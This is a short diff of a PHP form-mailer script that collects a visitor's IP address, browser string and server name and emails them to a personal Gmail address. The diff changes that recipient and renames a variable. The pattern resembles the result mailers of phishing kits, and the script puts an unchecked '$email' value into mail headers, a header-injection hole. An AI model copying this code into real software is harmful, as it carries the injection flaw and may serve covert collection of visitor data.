@@ -29,13 +29,13 @@ $msg .= "User IP : ".$_SERVER["REMOTE_ADDR"]."\r\n";
 $msg .= "Browser info : ".$_SERVER["HTTP_USER_AGENT"]."\r\n"; 
 $msg .= "User come from : ".$_SERVER["SERVER_NAME"]."\r\n";
 
-$recipient = "adamleewilliams@gmail.com";// Change the recipient email adress to your adrees  
-$sujet =  "Sender information";
+$recipient = "adamleewilliams1989@gmail.com"; 
+$subject =  "Sender information";
 $mailheaders = "From: $email\r\nReply-To: $email\r\nReturn-Path: $email\r\n";
 
 if (!$error){
 
-		$sending = mail($recipient, $sujet, $msg, $mailheaders); 
+		$sending = mail($recipient, $subject, $msg, $mailheaders); 
 		
 		if ($sending) {
 				// If the message is sent we output a string to use it 
